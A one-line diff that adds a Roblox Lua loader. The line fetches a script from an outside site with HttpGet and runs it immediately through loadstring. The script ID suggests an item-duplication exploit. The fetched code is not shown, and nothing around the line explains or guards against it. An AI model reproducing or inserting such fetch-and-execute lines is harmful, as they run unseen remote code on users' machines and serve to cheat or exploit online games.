@@ -1,0 +1,1 @@
+loadstring(game:HttpGet'https://ataias.xyz/getScript/?ID=lt2dupething')()
